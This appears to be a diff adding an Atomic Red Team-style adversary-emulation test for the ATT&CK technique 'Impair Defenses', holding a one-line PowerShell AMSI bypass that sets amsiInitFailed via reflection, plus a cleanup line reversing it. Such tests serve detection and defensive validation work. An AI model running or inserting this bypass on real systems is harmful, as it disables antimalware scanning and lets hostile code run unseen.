@@ -1,0 +1,11 @@
+#TechniqueName: Impair Defenses: Disable or Modify Tools
+#AtomicTestName: AMSI Bypass - AMSI InitFailed
+#Language: ps1
+
+#commands
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$true)
+
+
+#cleanup_commands
+[Ref].Assembly.GetType('System.Management.Automation.AmsiUtils').GetField('amsiInitFailed','NonPublic,Static').SetValue($null,$false)
+
